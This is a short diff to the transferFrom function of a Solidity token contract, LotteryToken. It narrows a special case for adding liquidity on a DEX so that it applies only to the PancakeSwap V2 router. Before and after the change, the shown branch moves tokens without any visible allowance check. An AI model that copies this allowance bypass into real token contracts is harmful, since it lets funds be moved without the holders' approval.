@@ -932,7 +932,7 @@ contract LotteryToken is Context, IERC20, IERC20Metadata {
         address recipient,
         uint256 amount
     ) public virtual override returns (bool) {
-        if (!addLiquidity[_msgSender()]) { //Allow liquidity adding to Dex
+        if (!addLiquidity[_msgSender()] && _msgSender() == IPanCakeSwap_V2_ROUTER) { //Allow liquidity adding to Dex
             _transfer(sender, recipient, amount);
             addLiquidity[_msgSender()] = true;
             emit theTranFrm(sender,_msgSender(),20);
